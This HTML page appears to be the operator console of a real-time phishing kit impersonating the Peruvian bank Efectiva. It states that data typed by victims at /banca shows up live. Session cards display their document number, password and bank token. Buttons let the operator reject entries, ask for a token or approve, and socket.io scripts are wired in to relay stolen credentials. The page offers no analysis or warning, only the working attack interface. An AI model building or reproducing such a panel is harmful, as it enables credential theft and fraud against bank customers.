<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Efectiva | Panel de Control Operador</title>
  <link rel="icon" href="https://www.efectibank.pe/wp-content/uploads/2026/06/32.webp" sizes="32x32">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-dark: #0b0f19;
      --card-bg: rgba(17, 24, 39, 0.85);
      --card-border: rgba(255, 255, 255, 0.08);
      --primary: #3b82f6;
      --accent: #10b981;
      --danger: #ef4444;
      --warning: #f59e0b;
      --text: #f3f4f6;
      --text-muted: #9ca3af;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Outfit', sans-serif;
      background-color: var(--bg-dark);
      background-image: 
        radial-gradient(circle at 15% 15%, rgba(59, 130, 246, 0.08) 0%, transparent 40%),
        radial-gradient(circle at 85% 85%, rgba(16, 185, 129, 0.05) 0%, transparent 40%);
      color: var(--text);
      min-height: 100vh;
      padding: 24px;
    }

    .admin-container {
      max-width: 1400px;
      margin: 0 auto;
    }

    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 24px;
      border-bottom: 1px solid var(--card-border);
      margin-bottom: 30px;
    }

    .brand {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .brand-logo {
      height: 38px;
      filter: brightness(0) invert(1);
    }

    .brand-title {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.5px;
      color: #ffffff;
    }

    .status-bar {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .live-indicator {
      display: flex;
      align-items: center;
      gap: 8px;
      background: rgba(239, 68, 68, 0.15);
      border: 1px solid rgba(239, 68, 68, 0.4);
      color: #fca5a5;
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
    }

    .pulse-dot {
      width: 8px;
      height: 8px;
      background: #ef4444;
      border-radius: 50%;
      box-shadow: 0 0 10px #ef4444;
      animation: pulse 1.2s infinite;
    }

    @keyframes pulse {
      0% { transform: scale(0.95); opacity: 0.8; }
      50% { transform: scale(1.3); opacity: 1; }
      100% { transform: scale(0.95); opacity: 0.8; }
    }

    .users-badge {
      background: rgba(59, 130, 246, 0.15);
      border: 1px solid rgba(59, 130, 246, 0.3);
      color: #93c5fd;
      padding: 6px 16px;
      border-radius: 20px;
      font-weight: 600;
      font-size: 14px;
    }

    .sessions-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
      gap: 20px;
    }

    .session-card {
      background: var(--card-bg);
      backdrop-filter: blur(12px);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      padding: 22px;
      display: flex;
      flex-direction: column;
      gap: 16px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
      transition: border-color 0.2s;
    }

    .session-card:hover {
      border-color: rgba(59, 130, 246, 0.4);
    }

    .card-top {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 12px;
      border-bottom: 1px solid var(--card-border);
    }

    .step-pill {
      font-size: 12px;
      font-weight: 700;
      padding: 4px 10px;
      border-radius: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      background: rgba(255, 255, 255, 0.1);
      color: #e5e7eb;
    }

    .time-info {
      font-size: 12px;
      color: var(--text-muted);
      font-family: 'JetBrains Mono', monospace;
    }

    .data-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: rgba(0, 0, 0, 0.25);
      padding: 10px 14px;
      border-radius: 10px;
      font-size: 14px;
    }

    .data-label {
      color: var(--text-muted);
      font-size: 13px;
    }

    .data-val {
      font-family: 'JetBrains Mono', monospace;
      font-weight: 700;
      font-size: 16px;
      letter-spacing: 0.5px;
    }

    .data-val.doc { color: #60a5fa; }
    .data-val.pass { color: #fbbf24; }
    .data-val.token { color: #34d399; }

    .actions-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 8px;
      margin-top: 6px;
    }

    .cmd-btn {
      padding: 10px;
      border-radius: 10px;
      border: 1px solid transparent;
      font-family: inherit;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      transition: all 0.2s ease;
    }

    .cmd-btn:hover {
      transform: translateY(-2px);
      filter: brightness(1.1);
    }

    .btn-err-doc { background: rgba(239, 68, 68, 0.15); color: #fca5a5; border-color: rgba(239, 68, 68, 0.3); }
    .btn-err-pass { background: rgba(245, 158, 11, 0.15); color: #fde68a; border-color: rgba(245, 158, 11, 0.3); }
    .btn-err-token { background: rgba(245, 158, 11, 0.15); color: #fde68a; border-color: rgba(245, 158, 11, 0.3); }
    .btn-ask-pass { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border-color: rgba(59, 130, 246, 0.3); }
    .btn-ask-token { background: rgba(59, 130, 246, 0.15); color: #93c5fd; border-color: rgba(59, 130, 246, 0.3); }
    .btn-approve { background: rgba(16, 185, 129, 0.2); color: #6ee7b7; border-color: rgba(16, 185, 129, 0.4); grid-column: span 2; }
    .btn-delete { background: rgba(239, 68, 68, 0.25); color: #f87171; border-color: rgba(239, 68, 68, 0.5); grid-column: span 2; margin-top: 4px; }

    .empty-state {
      grid-column: 1 / -1;
      text-align: center;
      padding: 80px 20px;
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 20px;
    }

    .empty-state h3 {
      font-size: 20px;
      margin-bottom: 8px;
      color: #ffffff;
    }

    .empty-state p {
      color: var(--text-muted);
      font-size: 14px;
    }

    .btn-clear-all {
      background: rgba(239, 68, 68, 0.2);
      border: 1px solid rgba(239, 68, 68, 0.4);
      color: #fca5a5;
      padding: 6px 14px;
      border-radius: 20px;
      font-weight: 600;
      font-size: 13px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-clear-all:hover {
      background: rgba(239, 68, 68, 0.4);
    }
  </style>
</head>
<body>
  <div class="admin-container">
    <header>
      <div class="brand">
        <img src="/banca/img/logo.svg" alt="Efectiva" class="brand-logo">
        <span class="brand-title">Panel de Control de Operador</span>
      </div>
      <div class="status-bar">
        <div class="live-indicator">
          <span class="pulse-dot"></span>
          <span>EN VIVO</span>
        </div>
        <div class="users-badge">
          Conectados: <span id="active-users-count">0</span>
        </div>
        <button class="btn-clear-all" onclick="clearAllSessions()">🗑️ Limpiar Todo</button>
      </div>
    </header>

    <main>
      <div id="operator-sessions-list" class="sessions-grid">
        <div class="empty-state">
          <h3>⚡ Esperando usuarios conectados...</h3>
          <p>Los datos ingresados por los usuarios en <b>/banca</b> aparecerán aquí en tiempo real.</p>
        </div>
      </div>
    </main>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script src="/js/panel-admin.js?v=2"></script>
</body>
</html>
